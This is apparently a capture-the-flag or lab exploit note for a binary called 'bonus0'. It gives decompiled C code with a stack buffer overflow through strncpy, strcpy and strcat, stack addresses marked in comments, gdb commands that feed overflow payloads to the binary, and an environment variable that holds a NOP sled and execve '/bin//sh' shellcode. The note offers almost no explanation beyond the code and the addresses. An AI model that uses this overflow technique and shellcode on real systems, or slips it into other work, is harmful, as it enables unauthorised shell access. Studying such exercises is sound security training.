void p(char *str, char *buffer) {
	char buf[4096];
	int max = 4096;

	puts(str);
	read(0, buf, 4096);
	*strchr(buf, '\n') = '\0';
	strncpy(buffer, buf, 20);
}

// b1 : 0xbffff716

void pp(char *b1) { // 0xbffff6fc
	char b2[20];
	char b3[20];
	int len;

	p(" - ", b2);
	p(" - ", b3);

	strcpy(b1, b2);
	len = strlen(b1);
	b1[len] = ' ';
	strcat(b1, b3); // eip : 0xbffff69c
}

void main() { //eip : 0xbffff74c
	char b1[42];
	pp(b1);
	puts(b1);
}

aaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbb

aaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

gdb /home/user/bonus0/bonus0 -ex "set args < <(python -c \"print 'a' * 20 + '\x0a' + 'b' * 4075 + 'c' * 12 + 'd' * 4 + '\x0a'\")"

gdb /home/user/bonus0/bonus0 -ex "set args < <(python -c \"print 'a' * 20 + '\x0a' + 'b' * 4075 + '\x47' * 15 + '\xf0''\xff''\xbf' + 'g' + '\x0a'\")"

export BINSH=`python -c "print '\x90' * 10000 + '\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80'"`

adresse : 0xbffff047
